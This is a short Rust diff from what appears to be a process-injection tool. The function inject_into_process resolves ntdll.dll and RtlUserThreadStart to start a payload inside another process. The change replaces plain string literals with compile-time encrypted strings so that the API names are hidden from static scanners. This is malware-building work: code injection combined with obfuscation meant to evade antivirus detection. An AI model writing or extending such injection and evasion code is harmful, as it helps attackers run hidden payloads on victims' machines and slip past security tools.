@@ -1323,11 +1323,11 @@ pub fn inject_into_process(process: HANDLE, payload: &[u8]) -> Result<()> {
     let entry_point = image_base as usize + nt_headers.OptionalHeader.AddressOfEntryPoint as usize;
     let mut thread: HANDLE = std::ptr::null_mut();
     
-    let ntdll = unsafe { winapi::um::libloaderapi::GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8) };
+    let ntdll = unsafe { winapi::um::libloaderapi::GetModuleHandleA(string_crypt::enc_str!("ntdll.dll").as_ptr() as *const i8) };
     if ntdll.is_null() {
         return Err(anyhow!("GetModuleHandleA failed for ntdll.dll"));
     }
-    let rtl_user_thread_start = unsafe { winapi::um::libloaderapi::GetProcAddress(ntdll, b"RtlUserThreadStart\0".as_ptr() as *const i8) };
+    let rtl_user_thread_start = unsafe { winapi::um::libloaderapi::GetProcAddress(ntdll, string_crypt::enc_str!("RtlUserThreadStart").as_ptr() as *const i8) };
     if rtl_user_thread_start.is_null() {
         return Err(anyhow!("GetProcAddress failed for RtlUserThreadStart"));
     }
